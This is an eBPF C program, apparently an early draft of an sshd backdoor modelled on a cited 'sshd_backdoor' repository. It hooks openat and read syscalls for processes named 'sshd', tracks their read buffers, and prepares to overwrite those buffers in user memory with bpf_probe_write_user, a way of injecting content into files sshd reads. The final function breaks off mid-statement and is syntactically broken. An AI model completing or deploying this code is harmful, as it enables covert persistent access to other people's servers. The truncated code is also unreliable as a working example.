/* SPDX-License-Identifier: GPL-2.0 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
// reference: https://github.com/Esonhugh/sshd_backdoor/tree/Skyworship

#define max_length 450 // max size
typedef unsigned int u32;
typedef int pid_t;

static const pid_t pid_filter = 0;
static const char *GOLD[2] = {
    "sshd",
    // "cat",
};

struct event {
    __u32 pid;
    char comm[TASK_COMM_LEN];
};
struct openat_args {
    const char *filename;
};
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 10240);
    __type(key, pid_t);
    __type(value, struct openat_args);
} openat_enter_map SEC(".maps"); // track these PIDs


struct syscall_read_logging 
{
    long unsigned int buffer_addr; // char buffer pointer addr
    long int calling_size; // read(size) store the size.
};



struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, pid_t);              // key is the pid
    // __type(value, long unsigned int); // char buffer pointer location
    __type(value, struct syscall_read_logging); 
} map_buff_addrs SEC(".maps"); // buffers from reading files

char LICENSE[] SEC("license") = "GPL";

SEC("tracepoint/syscalls/sys_enter_openat")
int handle_open(struct trace_event_raw_sys_enter* ctx)
{
    struct event evt = {};

    struct task_struct *task;
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    
    if (pid_filter && pid != pid_filter) {
        return 0;
    }
    task = (struct task_struct *)bpf_get_current_task();
    evt.pid = pid;
    struct openat_args args = {
        .filename = (const char *)ctx->args[1]  // second arg is filename
    };

    
    bpf_get_current_comm(&evt.comm, sizeof(evt.comm));
    int found = 0;
    #pragma unroll
    for (int i = 0; i < 2; i++) {
        if (bpf_strcmp(evt.comm, GOLD[i]) == 0) {
            found = 1;
            break;
        }
    }
    
    if (!found) {
        return 0;
    }
    bpf_printk("SSHD FOUND ON PID: %d args: %s!!!", pid, ctx->args[1]);
    bpf_map_update_elem(&openat_enter_map, &pid, &args, BPF_ANY); // track it

    return 0;
}


SEC("tracepoint/syscalls/sys_enter_read")
int enter_reading(struct trace_event_raw_sys_enter* ctx)
{
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    if (bpf_map_lookup_elem(&openat_enter_map, &pid)){
        bpf_printk("entered read!");
        long unsigned int buff_addr = ctx->args[1];
        size_t size = ctx->args[2];
        struct syscall_read_logging fileData;
        fileData.buffer_addr = buff_addr;
        fileData.calling_size = size;

        bpf_map_update_elem(&map_buff_addrs, &pid, &fileData, BPF_ANY);
        bpf_printk("updated map with size: %d!", size);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int exit_reading(struct trace_event_raw_sys_exit *ctx)
{
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    if (bpf_map_lookup_elem(&openat_enter_map, &pid) && ctx->ret >= 0){
        bpf_printk("tracked pid found exiting read!");
        struct syscall_read_logging *fileData;
        fileData = bpf_map_lookup_elem(&map_buff_addrs, &pid);
        if (fileData == 0){
            return 0; // nothing read.
        }
        long unsigned int buffer = fileData->buffer_addr;
        if (buffer <= 0){
            return 0;
        }
        long int read_size = ctx->ret;
        if (read_size < max_length || read_size == fileData->calling_size){
            return 0; // cannot write to buffer!
        }
        long unsigned int new_buff_addr = buffer + read_size - max_length;
        struct custom_payload *payload = bpf_map_lookup_elem(&map)
        bpf_probe_write_user((void *)new_buff_addr, )

    }
    return 0; // let everything continue as normal
}
